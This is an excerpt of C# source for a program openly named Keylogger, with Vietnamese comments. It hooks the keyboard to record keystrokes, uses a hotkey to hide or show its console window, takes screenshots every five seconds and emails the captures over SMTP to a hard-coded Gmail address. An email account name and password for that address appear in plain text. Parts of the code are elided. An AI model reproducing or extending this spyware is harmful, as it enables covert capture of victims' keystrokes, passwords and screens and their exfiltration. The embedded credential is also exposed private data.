...
namespace Keylogger {
    class Program {
        #region Hook key board (Bắt ký tự)
        ...
        // Khi ấn tổ hợp phím thì hiện/ẩn cửa sổ Console
        static void CheckHotKey (int vkCode) {
            if ((previoursKey == Keys.LControlKey || previoursKey == Keys.RControlKey) && (Keys) (vkCode) == Keys.D)
                isHotKey = true;
        ...
        #region Capture (Chụp màn hình)
        static string imagePath = "Image_";
        static string imageExtendtion = ".png";

        static int imageCount = 0;
        static int captureTime = 5000; // thời gian chụp màn hình là 5s
        ...
        #region Timer (Sau 1 khoảng thời gian lặp lại chụp màn hình, gửi mail)
        ...
        #region Mail (Gửi mail)
        static int mailTime = 5000; // thời gian gửi mail là 5s
        static void SendMail () {
            try {
                ...
                // mail nhận thư
                mail.To.Add ("dong472000@gmail.com");
                ...
                SmtpServer.Port = 587;
                // điền tài khoản mật khẩu gửi mail
                SmtpServer.Credentials = new System.Net.NetworkCredential ("dong472000@gmail.com", "Dong01633544758");
